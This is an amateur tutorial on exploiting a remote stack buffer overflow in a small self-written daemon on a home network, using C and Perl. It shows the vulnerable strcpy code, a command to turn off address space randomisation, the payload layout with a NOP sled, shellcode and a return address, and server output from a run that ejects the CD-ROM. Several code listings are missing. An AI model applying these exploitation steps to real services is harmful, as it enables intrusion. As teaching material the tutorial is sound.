[1.1]--[ Goal

Hi, Preddy here , 17 year old turkish kid from holland,First of all sorry for my english , please do notify me of any spelling errors.
I would recommend you to read my previous tutorial about "Simple Buffer Overflows"
to avoid misunderstanding in this tutorial and to get a basic understanding of buffer overflows.
Our goal is to write two remote exploits , one in c and one in perl.
Both of the exploits, exploit a vulnerability in a small vulnerable daemon.
You would need perl installed(eg: ActivePerl for windows) and a compiler for c 
(eg: cygwin for windows) you should have perl and a compiler package installed at your
linux distribution, you can install them with the following commands 
(incase you haven't got it installed) :

To search for the perl package:

apt-cache search perl

then to install it:

apt-get install [perl-pkg-name]

you can do the same with the compiler package.


[1.2]--[ Situation

I have a laptop on my left side and a desktop on my right-hand side.
the laptop uses the following local ip address: 192.168.1.100
and the desktop uses: 192.168.1.101 as it's local ip address.
The laptop is the attacker in this situation and the desktop is our victim.
both run slackware 10.2 and have the VA patch turned off.

Turning the VA patch off:

cat /proc/sys/kernel/randomize_va_space
1
echo 0 > /proc/sys/kernel/randomize_va_space
cat /proc/sys/kernel/randomize_va_space
0

The desktop computer runs a vulnerable daemon on port 7500 which we have to exploit
and open its cd-rom drive with the payload. Once again it's a very basic stack overflow
and this should be a piece of cake for the average exploit writer but it's very
usefull for people who are just starting to write exploits and exploit buffer overflows.

  while(1) {
    //grab connections
    conn = accept(sock, (struct sockaddr *)&client_addr, &sa_in_size);
    if (conn == -1) {
      perror("accept");
      exit(1);
    }

    //log the connecter
    printf("got connection from %s\n", inet_ntoa(client_addr.sin_addr));

    //send a greeting
    send(conn,MSG,strlen(MSG)+1,0);

    recv(conn, reply, 1024, 0);

    handle_reply(reply);

  }

  return 0;
}

This piece of code serves as a daemon and waits for people to connect,
on a successfull connection the server replies with a message and
waits for the user to reply back with his message.
The message get's stored in a buffer called 'reply' which can hold
1024 bytes of data.

the vulnerability lies in the handle_reply() function let's analyze it:

handle_reply()
---

int handle_reply(char *str)
{

char response[256];

strcpy(response,str);

printf("The client says \"%s\"\n",response);

return 0;

}
---

as you can see it has a response buffer which can hold 256 bytes of data
the reply message from the user gets copied in that buffer and the response
message is viewed at the server.

like this,

client:
---

telnet 192.168.1.101 7500
Trying 192.168.1.101...
Connected to 192.168.1.101.
Escape character is '^]'.
Hello, how are you?fine thanks how are you?

---

server:
---

got connection from 192.168.1.100
The client says "fine thanks how are you?
"
---

as you can see nothing special happens. But let's try to send a buffer which
is 272 bytes , which exceeds the buffersize of the response buffer in the handle_reply()
function.


[1.4]--[ Payload/Code construction/analyses in C

We want to send a 272 byte buffer to port 7500 of our victim (192.168.1.101)
so let's start by writing a simple piece of c code which can send 272 x A (0x41) to port
7500. Also don't forget to enable coredumps to analyze the overflow,

Enabling coredumps:

ulimit -c unlimited

as you see we have overwritten the extended intruction pointer with our own
eip which we constructed before in our payload (char *eip = "\x42\x42\x42\x42";)
and its overwritten with exacly BBBB

so now we have to place our shellcode in our payload and also our nopsled.
and finish a huge part of the exploit.

Let's pick a random address from the nopsled,

0xbffff2f8

write it in little-endian format (more info: http://www.answers.com/topic/endianness)

EIP:

\xf8\xf2\xff\xbf

and let's replace the old EIP with the new one in our "server_exploit.c" program

so:

char *eip = "\x42\x42\x42\x42";

becomes

char *eip = "\xf8\xf2\xff\xbf";

and let's recompile the program,

gcc server_exploit.c -o server_exploit

client:
---

./server_exploit 192.168.1.101
Payload Size: 272
Payload Sent..
---

server:
---
bash-3.00# ./server
got connection from 192.168.1.100
The client says "jX1ÉQhdromhev/ch///dãÍÃ°6f¹   SÍ@Íøòÿ¿"
^[[?1;2cbash-3.00# 1;2c
---

and yes, my cd-rom drive ejected....

as you can see we have managed to successfully exploit a remote
buffer overflow by using c code. Some people have allot of problems with
c , they find it hard or they are to lazy to learn it :PpPppP

Perl is allot easier to learn in my opinion and would be confortable for 
some people.The next section will use Perl to exploit this vulnerability
and open the cd-rom drive of the computer.


[1.5]--[ Payload/Code construction/analyses in Perl

Let's start again by sending a 272 byte buffer to the server in Perl,

send_overflow.pl

close($socket);

Let's start by running the script without any arguments,

perl send_overflow.pl
Specify ip plz..

And let's send the payload (272 x A - 0x41)

client:
---
perl send_overflow.pl 192.168.1.101

---

server:
---

bash-3.00# ./server
got connection from 192.168.1.100
The client says "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"

as you can see we have overwritten eip ,

now let's construct our payload

[NOPSLED - 228 bytes] + [SHELLCODE - 40 bytes] + [EIP - 4 bytes] = 272 bytes

we can just use the same payload from the C section
in it's perl form.

Let's run the perl script again:

perl server_exploit.pl 192.168.1.101

and yes! my cd-rom drive opened again :) what a miracle.. :PpPppP
(kids: don't irritate your father's box by continuesly opening his cd-rom drive)


[1.6]--[ Conclusion

Well we have learned to construct payloads and write exploits which
use those payloads. A good thing to do is to learn more about different
types of overflows and their exploitation methods, also practicing
different types of programming languages could be usefull.
